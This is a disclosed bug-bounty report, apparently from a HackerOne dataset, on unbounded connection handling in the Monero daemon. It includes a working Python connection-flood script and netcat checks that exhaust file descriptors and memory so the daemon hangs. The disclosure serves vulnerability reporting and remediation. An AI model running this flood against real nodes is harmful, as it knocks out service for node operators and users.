---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '543782'
original_report_id: '543782'
title: Excessive Resource Usage
weakness: Uncontrolled Resource Consumption
team_handle: monero
created_at: '2019-04-20T08:09:39.498Z'
disclosed_at: '2019-07-03T00:12:59.562Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Excessive Resource Usage

## Metadata

- HackerOne Report ID: 543782
- Weakness: Uncontrolled Resource Consumption
- Program: monero
- Disclosed At: 2019-07-03T00:12:59.562Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Unbounded resource usage due to open one file descriptor per connection, Python script below is effectively a threadbomb on the destination and uses all available memory on the server, clients not sending anything are never terminated.

## Steps To Reproduce:
Up our daemon
```
% monerod
```
Check if peer accepting connection
```
% nc -vz 127.0.0.1 18080
Connection to 127.0.0.1 18080 port [tcp/*] succeeded!
```
Create python script ex: resus.py
```python
import resource
import socket
import time

resource.setrlimit(resource.RLIMIT_NOFILE, (131072, 131072))

conn = []

while True:
    try:
        conn.append(socket.create_connection(("127.0.0.1", 18080)))
    except BaseException as err:
        print(err)
        break

print(len(conn))

while True:
    time.sleep(1)
```
run the script as ROOT(required for setting RLIMIT)
```
% sudo python resus.py
```
wait up 2 to minutes then run netcat again to check if our socket request bomb deny the service
```
% nc -vz 127.0.0.1 18080
```
now it's completely hang, during waiting you can run command ```lsof -i tcp``` to see lot of Monero connections

## Impact

Denial of Service(Allocation of Resources Without Limits or Throttling)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
